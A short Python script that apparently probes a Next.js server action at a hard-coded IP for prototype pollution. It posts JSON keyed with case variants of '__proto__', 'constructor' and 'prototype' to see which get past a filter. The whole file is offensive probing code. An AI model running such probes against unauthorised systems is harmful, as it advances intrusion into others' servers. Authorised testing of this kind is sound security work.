#!/usr/bin/env python3
import requests

TARGET = "http://223.6.249.127:41904"
ACTION_ID = "40625aabeb06d21a63d2489bff1118029e6456ec0c"

def send(payload):
    headers = {
        "Next-Action": ACTION_ID,
        "Content-Type": "text/plain;charset=UTF-8"
    }
    try:
        resp = requests.post(TARGET, headers=headers, data=payload, timeout=5)
        return resp.status_code
    except:
        return "TIMEOUT"

# 测试大小写
cases = [
    '__proto__',
    '__PROTO__', 
    '__Proto__',
    'CONSTRUCTOR',
    'Constructor',
    'PROTOTYPE',
    'Prototype',
]

for key in cases:
    payload = f'[{{"{key}": "test"}}]'
    status = send(payload)
    print(f"{key}: {status}")
